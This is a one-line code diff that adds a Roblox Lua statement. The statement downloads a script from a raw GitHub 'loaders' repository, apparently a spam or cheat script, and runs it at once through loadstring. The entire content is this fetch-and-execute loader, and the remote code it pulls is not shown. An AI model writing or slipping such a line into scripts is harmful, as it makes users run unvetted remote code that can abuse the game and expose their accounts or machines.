@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/beta-buddytime-spam0-vrzt7j5hhgowxp.lua"))()
